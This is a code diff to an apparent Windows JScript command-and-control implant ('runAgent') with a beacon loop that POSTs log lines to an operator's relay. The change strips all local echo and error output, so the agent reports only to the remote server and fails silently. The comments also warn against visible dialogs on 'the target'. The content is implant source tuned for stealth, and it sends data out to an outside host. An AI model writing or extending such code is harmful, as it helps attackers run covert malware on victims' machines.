@@ -1,5 +1,4 @@
 function runAgent() {
-    var CAN_ECHO = (typeof WScript != 'undefined');
     var shell = null, identityHeaders = null, exiting = false;
     var clrVersion = 'v4.0.30319';
     function ensureShell() {
@@ -10,22 +9,18 @@ function runAgent() {
     // broadcasts an agent_log event to the operator's events feed. NEVER fatal —
     // a failed ship must not kill the beacon loop — and the in-ship guard keeps a
     // failing relay from recursing (ship failure is echoed locally, never re-shipped).
-    // log() = local echo (always) + relay ship (always). Every line is POSTed with
-    // X-Agent-Log: 1: the relay answers immediately (no long-poll hold) and
-    // broadcasts an agent_log event to the operator's events feed. NEVER fatal —
-    // a failed ship must not kill the beacon loop — and the in-ship guard keeps a
-    // failing relay from recursing (ship failure is echoed locally, never re-shipped).
+    // log() = relay ship ONLY (zero local echo — no Echo, no alert, no dbg).
+    // Every line is POSTed with X-Agent-Log: 1: the relay answers immediately
+    // (no long-poll hold) and broadcasts an agent_log event to the operator's
+    // events feed. NEVER fatal — a failed ship is swallowed in silence — and the
+    // in-ship guard keeps a failing relay from recursing. Body = one frame holding
+    // the line (UTF-8-ish: chars are masked to a byte). Each call is one
+    // synchronous round-trip that stalls the agent loop — keep log() calls to
+    // milestones, never inside tight loops.
     var inShip = false;
     function log(line) {
-        // Local echo: cscript console (dev) and the dbg() hook only — NEVER alert():
-        // an mshta host would pop a visible dialog on the target per line.
-        if (CAN_ECHO) WScript.Echo(line);
-        if (typeof dbg != 'undefined') dbg(line);
         postLog(line);
     }
-    // Body = one frame holding the line (UTF-8-ish: chars are masked to a byte).
-    // Each call is one synchronous round-trip that stalls the agent loop — keep
-    // log() calls to milestones, never inside tight loops.
     function postLog(line) {
         if (inShip || !beaconUrl || !identityHeaders) return;
         inShip = true;
@@ -42,7 +37,6 @@ function runAgent() {
             xhr.setRequestHeader('X-Agent-Log', '1');
             xhr.send(buildBodyStream([bytes]));
         } catch (e) {
-            if (CAN_ECHO) WScript.Echo('postLog failed: ' + (e && e.message ? e.message : e));
         } finally { inShip = false; }
     }
     function readEnv(name) {
